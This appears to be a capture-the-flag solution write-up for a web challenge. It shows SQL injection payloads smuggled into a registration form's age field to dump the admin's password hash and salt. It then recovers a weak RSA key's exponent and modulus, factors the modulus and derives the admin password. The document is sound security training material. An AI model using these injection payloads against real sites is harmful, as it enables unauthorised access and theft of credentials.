fullname=le+giap&age=15,0x3a,0x3a,0x3a),(0x6173646d6373637a767373737863636963636e73,(select * from (SELECT hashPass from users where id=1) as some),0x3a,0x3a,0x3a,0x3a)-- -&username=asdmcsczvsssxcciccns&password=156dsada
=>>> get the admin hashPass =>> relize that can break == operator


We now find the salt value by set the RSAPass = 0
fullname=le+giap&age=15&username=salt&password=0 this make a account with RSAPass=0
fullname=le+giap&age=15,0x3a,0x3a,0x3a),(0x6173637273,(select * from (SELECT (hashPass) from users where username=0x73616c74) as some),0x3a,0x3a,0x3a,0x3a)-- -&username=ascrs&password=0   this get the hashpass = b6156a2d23aef0f07ef8e2337558f372 =>> salt = 708
Player can try by set the password=1 and see the hashpass result



We now find e
fullname=legiap&age=15&username=finde&password=2 this make a account with password=2
3291009114642412084309938365114701009965471731267159726697218048 => guess that e = 211

fullname=legiap&age=15&username=finde2&password=3 this make a account with password=3
47052721287394587764057094854672253553918218437190874778408030747195017485692977810906266281547645147 => yep! e = 211 absolutely



We now find n
fullname=legiap&age=15&username=findn&password=4
453314752003752778097114229701392063829336702621163592207108729002021168303075079111671255864835847209526269
fullname=legiap&age=15&username=findn2&password=5
468938284829517636365973564741574597213673860803677535228861002294457184119544620576401998591067514887376125
fullname=legiap&age=15&username=findn3&password=6
79460316609988712270809935265899884727581927242456924106762085596678841048233625462228189915233798513788086

a1 = pow(4,211) - 453314752003752778097114229701392063829336702621163592207108729002021168303075079111671255864835847209526269
a2 = pow(5,211) - 468938284829517636365973564741574597213673860803677535228861002294457184119544620576401998591067514887376125
a3 = pow(6,211) - 79460316609988712270809935265899884727581927242456924106762085596678841048233625462228189915233798513788086
print gcd(a1,a2,a3)
==>>> n = 896438861189027048158523957736620708653256296055366615236171641286531910858859227747814590357814153758797905



We then factorize n
r1=39756064319 (pp11)
r2=50460162223 (pp11)
r3=52939037339 (pp11)
r4=866241958618750463 (pp18)
r5=21510640199660245228192615811 (pp29)
r6=30200128956820657224460252673 (pp29)
Then Phi(n) = 836676270389661210923877358389016442546359484253662799228090492844638641254860804561820935273479336386068480
==> d = 360841424670422607554847581106163489439425180412717131420645662790815717318447076848936991042116680621479771

=>> password we need is rsa.core.decrypt_int(240610, d, n) = 80573515912474873759830528995058722328185995800431320776850044519971580724695544729090859806405797286317985
